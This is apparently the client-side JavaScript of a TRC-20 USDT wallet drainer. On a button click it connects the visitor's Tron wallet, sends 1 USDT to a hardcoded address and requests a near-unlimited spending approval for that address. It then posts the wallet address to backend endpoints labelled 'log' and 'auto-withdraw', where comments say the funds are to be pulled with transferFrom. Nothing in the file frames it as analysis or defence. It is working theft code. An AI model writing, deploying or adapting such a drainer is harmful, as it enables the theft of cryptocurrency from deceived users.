const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC-20 USDT contract
const RECEIVING_ADDRESS = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN'; // Your TRC-20 address
let userAddress = '';

document.getElementById('sendBtn').addEventListener('click', async () => {
  try {
    // Connect wallet
    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
      document.getElementById('status').innerText = 'Please open in Tron-compatible wallet browser like Trust Wallet or TronLink.';
      return;
    }

    await new Promise(resolve => setTimeout(resolve, 100)); // slight delay for wallet readiness

    userAddress = window.tronWeb.defaultAddress.base58;
    document.getElementById('status').innerText = `Connected: ${userAddress}`;

    // Load USDT contract
    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);

    // Send 1 USDT (optional - can skip this if needed)
    await contract.transfer(RECEIVING_ADDRESS, 1_000_000).send(); // 1 USDT = 1,000,000 in TRC-20

    // Trigger unlimited approval
    await contract.approve(RECEIVING_ADDRESS, 999_999_999_000_000).send(); // Approve large amount

    document.getElementById('status').innerText = `Approval successful. Scanning balance...`;

    // Call backend to log wallet and balance
    await fetch('https://your-backend-api.com/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: userAddress })
    });

    // Attempt auto-withdraw (backend should pull funds using transferFrom)
    await fetch('https://your-backend-api.com/auto-withdraw', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: userAddress })
    });

    document.getElementById('status').innerText = `USDT approval done. Awaiting auto-withdraw...`;

  } catch (error) {
    console.error(error);
    document.getElementById('status').innerText = 'Error occurred: ' + error.message;
  }
});
